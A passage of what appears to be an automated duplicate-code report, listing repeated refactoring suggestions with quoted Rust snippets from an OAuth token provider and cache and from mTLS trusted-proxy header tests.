        assert!(url.contains("client_id=test-client-id"));
        assert!(url.contains("state=test-state"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.5% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 526

**Code:**
```
    fn test_authorization_url_with_pkce() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();

        let url = provider.get_authorization_url("test-state", Some("test-challenge"));
        assert!(url.contains("code_challenge=test-challenge"));
        assert!(url.contains("code_challenge_method=S256"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.4% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 250

**Code:**
```
    fn hash_token(token: &str) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(token.as_bytes());
        base64::Engine::encode(&base64::engine::general_purpose::URL_SAFE_NO_PAD, hasher.finalize())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.4% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 250

**Code:**
```
    fn hash_token(token: &str) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(token.as_bytes());
        base64::Engine::encode(&base64::engine::general_purpose::URL_SAFE_NO_PAD, hasher.finalize())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.1% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 123

**Code:**
```
    fn cleanup_expired(&mut self) {
        let before = self.entries.len();
        self.entries
            .retain(|_, cached| cached.cached_at.elapsed() < self.cache_duration);
        let removed = before - self.entries.len();
        if removed > 0 {
            tracing::debug!(removed = removed, remaining = self.entries.len(), "Token cache cleanup");
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.0% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 592

**Code:**
```
    fn test_parse_token_info_inactive() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();

        let body = serde_json::json!({
            "active": false
        });

        let info = provider.parse_token_info(&body).unwrap();
        assert!(!info.active);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 86.0% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 500

**Code:**
```
    fn test_github_endpoints() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();
        assert_eq!(
            provider.authorization_url,
            "https://github.com/login/oauth/authorize"
        );
        assert_eq!(
            provider.token_url,
            "https://github.com/login/oauth/access_token"
        );
        assert_eq!(provider.userinfo_url, "https://api.github.com/user");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 85.7% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 500

**Code:**
```
    fn test_github_endpoints() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();
        assert_eq!(
            provider.authorization_url,
            "https://github.com/login/oauth/authorize"
        );
        assert_eq!(
            provider.token_url,
            "https://github.com/login/oauth/access_token"
        );
        assert_eq!(provider.userinfo_url, "https://api.github.com/user");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 85.6% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 605

**Code:**
```
    fn test_scope_to_tool_mapping() {
        let mut scope_mapping = HashMap::new();
        scope_mapping.insert("read:files".to_string(), vec!["read_file".to_string()]);
        scope_mapping.insert("write:files".to_string(), vec!["write_file".to_string()]);

        let tools = map_scopes_to_tools(
            &["read:files".to_string(), "write:files".to_string()],
            &scope_mapping,
        );
        assert!(tools.is_some());
        let tools = tools.unwrap();
        assert!(tools.contains(&"read_file".to_string()));
        assert!(tools.contains(&"write_file".to_string()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 85.4% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 134

**Code:**
```
    fn evict_oldest(&mut self) {
        // Collect entries with their ages
        let mut entries: Vec<_> = self
            .entries
            .iter()
            .map(|(k, v)| (k.clone(), v.cached_at))
            .collect();

        // Sort by age (oldest first)
        entries.sort_by(|a, b| a.1.cmp(&b.1));

        // Remove oldest entries until we're under the limit
        let to_remove = self.entries.len() - CACHE_MAX_ENTRIES + 50; // Remove 50 extra to avoid frequent eviction
        for (key, _) in entries.into_iter().take(to_remove) {
            self.entries.remove(&key);
        }

        tracing::debug!(
            removed = to_remove,
            remaining = self.entries.len(),
            "Token cache evicted oldest entries"
        );
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 85.3% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 557

**Code:**
```
    fn test_parse_token_info_introspection() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();

        let body = serde_json::json!({
            "active": true,
            "sub": "user123",
            "username": "testuser",
            "scope": "read:user repo"
        });

        let info = provider.parse_token_info(&body).unwrap();
        assert!(info.active);
        assert_eq!(info.user_id, Some("user123".to_string()));
        assert_eq!(info.username, Some("testuser".to_string()));
        assert_eq!(info.scopes, vec!["read:user".to_string(), "repo".to_string()]);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 85.3% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 576

**Code:**
```
    fn test_parse_token_info_github_userinfo() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();

        let body = serde_json::json!({
            "id": 12345,
            "login": "octocat",
            "name": "The Octocat"
        });

        let info = provider.parse_token_info(&body).unwrap();
        assert_eq!(info.user_id, Some("12345".to_string()));
        assert_eq!(info.username, Some("The Octocat".to_string()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 85.2% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 123

**Code:**
```
    fn cleanup_expired(&mut self) {
        let before = self.entries.len();
        self.entries
            .retain(|_, cached| cached.cached_at.elapsed() < self.cache_duration);
        let removed = before - self.entries.len();
        if removed > 0 {
            tracing::debug!(removed = removed, remaining = self.entries.len(), "Token cache cleanup");
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 85.2% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 123

**Code:**
```
    fn cleanup_expired(&mut self) {
        let before = self.entries.len();
        self.entries
            .retain(|_, cached| cached.cached_at.elapsed() < self.cache_duration);
        let removed = before - self.entries.len();
        if removed > 0 {
            tracing::debug!(removed = removed, remaining = self.entries.len(), "Token cache cleanup");
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 85.1% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 536

**Code:**
```
    fn test_custom_provider_requires_urls() {
        let config = OAuthConfig {
            provider: OAuthProviderType::Custom,
            client_id: "test".to_string(),
            client_secret: None,
            authorization_url: None, // Missing required URL
            token_url: None,
            introspection_url: None,
            userinfo_url: None,
            redirect_uri: "http://localhost:3000/oauth/callback".to_string(),
            scopes: vec![],
            user_id_claim: "sub".to_string(),
            scope_tool_mapping: HashMap::new(),
            token_cache_ttl_secs: 300,
        };

        let result = OAuthAuthProvider::new(config);
        assert!(result.is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.9% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 250

**Code:**
```
    fn hash_token(token: &str) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(token.as_bytes());
        base64::Engine::encode(&base64::engine::general_purpose::URL_SAFE_NO_PAD, hasher.finalize())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.8% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 123

**Code:**
```
    fn cleanup_expired(&mut self) {
        let before = self.entries.len();
        self.entries
            .retain(|_, cached| cached.cached_at.elapsed() < self.cache_duration);
        let removed = before - self.entries.len();
        if removed > 0 {
            tracing::debug!(removed = removed, remaining = self.entries.len(), "Token cache cleanup");
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.7% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 493

**Code:**
```
    fn test_provider_creation() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();
        assert_eq!(provider.name(), "oauth");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.7% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 475

**Code:**
```
    fn create_test_config() -> OAuthConfig {
        OAuthConfig {
            provider: OAuthProviderType::GitHub,
            client_id: "test-client-id".to_string(),
            client_secret: Some("test-secret".to_string()),
            authorization_url: None,
            token_url: None,
            introspection_url: None,
            userinfo_url: None,
            redirect_uri: "http://localhost:3000/oauth/callback".to_string(),
            scopes: vec!["read:user".to_string()],
            user_id_claim: "sub".to_string(),
            scope_tool_mapping: HashMap::new(),
            token_cache_ttl_secs: 300,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.6% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 500

**Code:**
```
    fn test_github_endpoints() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();
        assert_eq!(
            provider.authorization_url,
            "https://github.com/login/oauth/authorize"
        );
        assert_eq!(
            provider.token_url,
            "https://github.com/login/oauth/access_token"
        );
        assert_eq!(provider.userinfo_url, "https://api.github.com/user");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.6% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 123

**Code:**
```
    fn cleanup_expired(&mut self) {
        let before = self.entries.len();
        self.entries
            .retain(|_, cached| cached.cached_at.elapsed() < self.cache_duration);
        let removed = before - self.entries.len();
        if removed > 0 {
            tracing::debug!(removed = removed, remaining = self.entries.len(), "Token cache cleanup");
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.5% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 250

**Code:**
```
    fn hash_token(token: &str) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(token.as_bytes());
        base64::Engine::encode(&base64::engine::general_purpose::URL_SAFE_NO_PAD, hasher.finalize())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.4% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 134

**Code:**
```
    fn evict_oldest(&mut self) {
        // Collect entries with their ages
        let mut entries: Vec<_> = self
            .entries
            .iter()
            .map(|(k, v)| (k.clone(), v.cached_at))
            .collect();

        // Sort by age (oldest first)
        entries.sort_by(|a, b| a.1.cmp(&b.1));

        // Remove oldest entries until we're under the limit
        let to_remove = self.entries.len() - CACHE_MAX_ENTRIES + 50; // Remove 50 extra to avoid frequent eviction
        for (key, _) in entries.into_iter().take(to_remove) {
            self.entries.remove(&key);
        }

        tracing::debug!(
            removed = to_remove,
            remaining = self.entries.len(),
            "Token cache evicted oldest entries"
        );
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.1% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 123

**Code:**
```
    fn cleanup_expired(&mut self) {
        let before = self.entries.len();
        self.entries
            .retain(|_, cached| cached.cached_at.elapsed() < self.cache_duration);
        let removed = before - self.entries.len();
        if removed > 0 {
            tracing::debug!(removed = removed, remaining = self.entries.len(), "Token cache cleanup");
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.1% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 621

**Code:**
```
    fn test_scope_to_tool_mapping_wildcard() {
        let mut scope_mapping = HashMap::new();
        scope_mapping.insert("admin".to_string(), vec!["*".to_string()]);

        // Wildcard should return None (all tools allowed)
        let tools = map_scopes_to_tools(&["admin".to_string()], &scope_mapping);
        assert!(tools.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 83.3% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 515

**Code:**
```
    fn test_authorization_url_generation() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();

        let url = provider.get_authorization_url("test-state", None);
        assert!(url.contains("response_type=code"));
        assert!(url.contains("client_id=test-client-id"));
        assert!(url.contains("state=test-state"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 83.3% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 557

**Code:**
```
    fn test_parse_token_info_introspection() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();

        let body = serde_json::json!({
            "active": true,
            "sub": "user123",
            "username": "testuser",
            "scope": "read:user repo"
        });

        let info = provider.parse_token_info(&body).unwrap();
        assert!(info.active);
        assert_eq!(info.user_id, Some("user123".to_string()));
        assert_eq!(info.username, Some("testuser".to_string()));
        assert_eq!(info.scopes, vec!["read:user".to_string(), "repo".to_string()]);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 83.0% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 123

**Code:**
```
    fn cleanup_expired(&mut self) {
        let before = self.entries.len();
        self.entries
            .retain(|_, cached| cached.cached_at.elapsed() < self.cache_duration);
        let removed = before - self.entries.len();
        if removed > 0 {
            tracing::debug!(removed = removed, remaining = self.entries.len(), "Token cache cleanup");
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 82.9% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 250

**Code:**
```
    fn hash_token(token: &str) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(token.as_bytes());
        base64::Engine::encode(&base64::engine::general_purpose::URL_SAFE_NO_PAD, hasher.finalize())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 82.9% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 493

**Code:**
```
    fn test_provider_creation() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();
        assert_eq!(provider.name(), "oauth");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 82.9% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 83

**Code:**
```
    fn new(cache_duration: Duration) -> Self {
        Self {
            entries: HashMap::new(),
            cache_duration,
            insert_count: 0,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 82.6% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 493

**Code:**
```
    fn test_provider_creation() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();
        assert_eq!(provider.name(), "oauth");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 81.5% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 123

**Code:**
```
    fn cleanup_expired(&mut self) {
        let before = self.entries.len();
        self.entries
            .retain(|_, cached| cached.cached_at.elapsed() < self.cache_duration);
        let removed = before - self.entries.len();
        if removed > 0 {
            tracing::debug!(removed = removed, remaining = self.entries.len(), "Token cache cleanup");
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 81.5% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 25

**Code:**
```
    fn for_provider(provider: &OAuthProviderType) -> Option<Self> {
        match provider {
            OAuthProviderType::GitHub => Some(Self {
                authorization_url: "https://github.com/login/oauth/authorize",
                token_url: "https://github.com/login/oauth/access_token",
                userinfo_url: "https://api.github.com/user",
                introspection_url: None, // GitHub doesn't support introspection
            }),
            OAuthProviderType::Google => Some(Self {
                authorization_url: "https://accounts.google.com/o/oauth2/v2/auth",
                token_url: "https://oauth2.googleapis.com/token",
                userinfo_url: "https://openidconnect.googleapis.com/v1/userinfo",
                introspection_url: Some("https://oauth2.googleapis.com/tokeninfo"),
            }),
            OAuthProviderType::Okta => None, // Requires tenant-specific URLs
            OAuthProviderType::Custom => None,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 81.2% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 493

**Code:**
```
    fn test_provider_creation() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();
        assert_eq!(provider.name(), "oauth");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 81.2% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 500

**Code:**
```
    fn test_github_endpoints() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();
        assert_eq!(
            provider.authorization_url,
            "https://github.com/login/oauth/authorize"
        );
        assert_eq!(
            provider.token_url,
            "https://github.com/login/oauth/access_token"
        );
        assert_eq!(provider.userinfo_url, "https://api.github.com/user");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 81.2% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 526

**Code:**
```
    fn test_authorization_url_with_pkce() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();

        let url = provider.get_authorization_url("test-state", Some("test-challenge"));
        assert!(url.contains("code_challenge=test-challenge"));
        assert!(url.contains("code_challenge_method=S256"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 81.2% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 25

**Code:**
```
    fn for_provider(provider: &OAuthProviderType) -> Option<Self> {
        match provider {
            OAuthProviderType::GitHub => Some(Self {
                authorization_url: "https://github.com/login/oauth/authorize",
                token_url: "https://github.com/login/oauth/access_token",
                userinfo_url: "https://api.github.com/user",
                introspection_url: None, // GitHub doesn't support introspection
            }),
            OAuthProviderType::Google => Some(Self {
                authorization_url: "https://accounts.google.com/o/oauth2/v2/auth",
                token_url: "https://oauth2.googleapis.com/token",
                userinfo_url: "https://openidconnect.googleapis.com/v1/userinfo",
                introspection_url: Some("https://oauth2.googleapis.com/tokeninfo"),
            }),
            OAuthProviderType::Okta => None, // Requires tenant-specific URLs
            OAuthProviderType::Custom => None,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 81.0% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 25

**Code:**
```
    fn for_provider(provider: &OAuthProviderType) -> Option<Self> {
        match provider {
            OAuthProviderType::GitHub => Some(Self {
                authorization_url: "https://github.com/login/oauth/authorize",
                token_url: "https://github.com/login/oauth/access_token",
                userinfo_url: "https://api.github.com/user",
                introspection_url: None, // GitHub doesn't support introspection
            }),
            OAuthProviderType::Google => Some(Self {
                authorization_url: "https://accounts.google.com/o/oauth2/v2/auth",
                token_url: "https://oauth2.googleapis.com/token",
                userinfo_url: "https://openidconnect.googleapis.com/v1/userinfo",
                introspection_url: Some("https://oauth2.googleapis.com/tokeninfo"),
            }),
            OAuthProviderType::Okta => None, // Requires tenant-specific URLs
            OAuthProviderType::Custom => None,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 81.0% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 557

**Code:**
```
    fn test_parse_token_info_introspection() {
        let config = create_test_config();
        let provider = OAuthAuthProvider::new(config).unwrap();

        let body = serde_json::json!({
            "active": true,
            "sub": "user123",
            "username": "testuser",
            "scope": "read:user repo"
        });

        let info = provider.parse_token_info(&body).unwrap();
        assert!(info.active);
        assert_eq!(info.user_id, Some("user123".to_string()));
        assert_eq!(info.username, Some("testuser".to_string()));
        assert_eq!(info.scopes, vec!["read:user".to_string(), "repo".to_string()]);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 81.0% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 134

**Code:**
```
    fn evict_oldest(&mut self) {
        // Collect entries with their ages
        let mut entries: Vec<_> = self
            .entries
            .iter()
            .map(|(k, v)| (k.clone(), v.cached_at))
            .collect();

        // Sort by age (oldest first)
        entries.sort_by(|a, b| a.1.cmp(&b.1));

        // Remove oldest entries until we're under the limit
        let to_remove = self.entries.len() - CACHE_MAX_ENTRIES + 50; // Remove 50 extra to avoid frequent eviction
        for (key, _) in entries.into_iter().take(to_remove) {
            self.entries.remove(&key);
        }

        tracing::debug!(
            removed = to_remove,
            remaining = self.entries.len(),
            "Token cache evicted oldest entries"
        );
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.9% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 134

**Code:**
```
    fn evict_oldest(&mut self) {
        // Collect entries with their ages
        let mut entries: Vec<_> = self
            .entries
            .iter()
            .map(|(k, v)| (k.clone(), v.cached_at))
            .collect();

        // Sort by age (oldest first)
        entries.sort_by(|a, b| a.1.cmp(&b.1));

        // Remove oldest entries until we're under the limit
        let to_remove = self.entries.len() - CACHE_MAX_ENTRIES + 50; // Remove 50 extra to avoid frequent eviction
        for (key, _) in entries.into_iter().take(to_remove) {
            self.entries.remove(&key);
        }

        tracing::debug!(
            removed = to_remove,
            remaining = self.entries.len(),
            "Token cache evicted oldest entries"
        );
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.9% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 123

**Code:**
```
    fn cleanup_expired(&mut self) {
        let before = self.entries.len();
        self.entries
            .retain(|_, cached| cached.cached_at.elapsed() < self.cache_duration);
        let removed = before - self.entries.len();
        if removed > 0 {
            tracing::debug!(removed = removed, remaining = self.entries.len(), "Token cache cleanup");
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.5% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 91

**Code:**
```
    fn get(&self, token_hash: &str) -> Option<&TokenInfo> {
        self.entries.get(token_hash).and_then(|cached| {
            if cached.cached_at.elapsed() < self.cache_duration {
                Some(&cached.info)
            } else {
                None
            }
        })
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.3% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 134

**Code:**
```
    fn evict_oldest(&mut self) {
        // Collect entries with their ages
        let mut entries: Vec<_> = self
            .entries
            .iter()
            .map(|(k, v)| (k.clone(), v.cached_at))
            .collect();

        // Sort by age (oldest first)
        entries.sort_by(|a, b| a.1.cmp(&b.1));

        // Remove oldest entries until we're under the limit
        let to_remove = self.entries.len() - CACHE_MAX_ENTRIES + 50; // Remove 50 extra to avoid frequent eviction
        for (key, _) in entries.into_iter().take(to_remove) {
            self.entries.remove(&key);
        }

        tracing::debug!(
            removed = to_remove,
            remaining = self.entries.len(),
            "Token cache evicted oldest entries"
        );
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.2% similarity.

- **File:** `src/auth/oauth.rs`
- **Line:** 134

**Code:**
```
    fn evict_oldest(&mut self) {
        // Collect entries with their ages
        let mut entries: Vec<_> = self
            .entries
            .iter()
            .map(|(k, v)| (k.clone(), v.cached_at))
            .collect();

        // Sort by age (oldest first)
        entries.sort_by(|a, b| a.1.cmp(&b.1));

        // Remove oldest entries until we're under the limit
        let to_remove = self.entries.len() - CACHE_MAX_ENTRIES + 50; // Remove 50 extra to avoid frequent eviction
        for (key, _) in entries.into_iter().take(to_remove) {
            self.entries.remove(&key);
        }

        tracing::debug!(
            removed = to_remove,
            remaining = self.entries.len(),
            "Token cache evicted oldest entries"
        );
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.7% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 437

**Code:**
```
    fn test_from_headers_if_trusted_accepts_trusted() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec![],
            rate_limit: None,
            trusted_proxy_ips: vec!["10.0.0.1".to_string()],
        };
        let provider = MtlsAuthProvider::new(config);

        let mut headers = HeaderMap::new();
        headers.insert(HEADER_CLIENT_CERT_VERIFIED, "SUCCESS".parse().unwrap());
        headers.insert(HEADER_CLIENT_CERT_CN, "trusted-client".parse().unwrap());

        let trusted_ip: IpAddr = "10.0.0.1".parse().unwrap();
        let cert_info = ClientCertInfo::from_headers_if_trusted(&headers, &trusted_ip, &provider);

        assert!(cert_info.is_some());
        assert_eq!(cert_info.unwrap().common_name, Some("trusted-client".to_string()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.7% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 437

**Code:**
```
    fn test_from_headers_if_trusted_accepts_trusted() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec![],
            rate_limit: None,
            trusted_proxy_ips: vec!["10.0.0.1".to_string()],
        };
        let provider = MtlsAuthProvider::new(config);

        let mut headers = HeaderMap::new();
        headers.insert(HEADER_CLIENT_CERT_VERIFIED, "SUCCESS".parse().unwrap());
        headers.insert(HEADER_CLIENT_CERT_CN, "trusted-client".parse().unwrap());

        let trusted_ip: IpAddr = "10.0.0.1".parse().unwrap();
        let cert_info = ClientCertInfo::from_headers_if_trusted(&headers, &trusted_ip, &provider);

        assert!(cert_info.is_some());
        assert_eq!(cert_info.unwrap().common_name, Some("trusted-client".to_string()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.7% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 437

**Code:**
```
    fn test_from_headers_if_trusted_accepts_trusted() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec![],
            rate_limit: None,
            trusted_proxy_ips: vec!["10.0.0.1".to_string()],
        };
        let provider = MtlsAuthProvider::new(config);

        let mut headers = HeaderMap::new();
        headers.insert(HEADER_CLIENT_CERT_VERIFIED, "SUCCESS".parse().unwrap());
        headers.insert(HEADER_CLIENT_CERT_CN, "trusted-client".parse().unwrap());

        let trusted_ip: IpAddr = "10.0.0.1".parse().unwrap();
        let cert_info = ClientCertInfo::from_headers_if_trusted(&headers, &trusted_ip, &provider);

        assert!(cert_info.is_some());
        assert_eq!(cert_info.unwrap().common_name, Some("trusted-client".to_string()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.7% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 459

**Code:**
```
    fn test_from_headers_if_trusted_rejects_untrusted() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec![],
            rate_limit: None,
            trusted_proxy_ips: vec!["10.0.0.1".to_string()],
        };
        let provider = MtlsAuthProvider::new(config);

        let mut headers = HeaderMap::new();
        headers.insert(HEADER_CLIENT_CERT_VERIFIED, "SUCCESS".parse().unwrap());
        headers.insert(HEADER_CLIENT_CERT_CN, "spoofed-client".parse().unwrap());

        // Attacker IP not in trusted list
        let attacker_ip: IpAddr = "8.8.8.8".parse().unwrap();
        let cert_info = ClientCertInfo::from_headers_if_trusted(&headers, &attacker_ip, &provider);

        assert!(cert_info.is_none()); // Headers should be rejected
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.7% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 459

**Code:**
```
    fn test_from_headers_if_trusted_rejects_untrusted() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec![],
            rate_limit: None,
            trusted_proxy_ips: vec!["10.0.0.1".to_string()],
        };
        let provider = MtlsAuthProvider::new(config);

        let mut headers = HeaderMap::new();
        headers.insert(HEADER_CLIENT_CERT_VERIFIED, "SUCCESS".parse().unwrap());
        headers.insert(HEADER_CLIENT_CERT_CN, "spoofed-client".parse().unwrap());

        // Attacker IP not in trusted list
        let attacker_ip: IpAddr = "8.8.8.8".parse().unwrap();
        let cert_info = ClientCertInfo::from_headers_if_trusted(&headers, &attacker_ip, &provider);

        assert!(cert_info.is_none()); // Headers should be rejected
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.7% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 459

**Code:**
```
    fn test_from_headers_if_trusted_rejects_untrusted() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec![],
            rate_limit: None,
            trusted_proxy_ips: vec!["10.0.0.1".to_string()],
        };
        let provider = MtlsAuthProvider::new(config);

        let mut headers = HeaderMap::new();
        headers.insert(HEADER_CLIENT_CERT_VERIFIED, "SUCCESS".parse().unwrap());
        headers.insert(HEADER_CLIENT_CERT_CN, "spoofed-client".parse().unwrap());

        // Attacker IP not in trusted list
        let attacker_ip: IpAddr = "8.8.8.8".parse().unwrap();
        let cert_info = ClientCertInfo::from_headers_if_trusted(&headers, &attacker_ip, &provider);

        assert!(cert_info.is_none()); // Headers should be rejected
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.7% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 481

**Code:**
```
    fn test_from_headers_if_trusted_rejects_when_no_trusted_configured() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec![],
            rate_limit: None,
            trusted_proxy_ips: vec![], // No trusted IPs!
        };
        let provider = MtlsAuthProvider::new(config);

        let mut headers = HeaderMap::new();
        headers.insert(HEADER_CLIENT_CERT_VERIFIED, "SUCCESS".parse().unwrap());
        headers.insert(HEADER_CLIENT_CERT_CN, "any-client".parse().unwrap());

        // Even localhost should be rejected
        let localhost: IpAddr = "127.0.0.1".parse().unwrap();
        let cert_info = ClientCertInfo::from_headers_if_trusted(&headers, &localhost, &provider);

        assert!(cert_info.is_none()); // No trusted proxies = reject all header auth
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.7% similarity.

- **File:** `src/auth/mtls.rs`
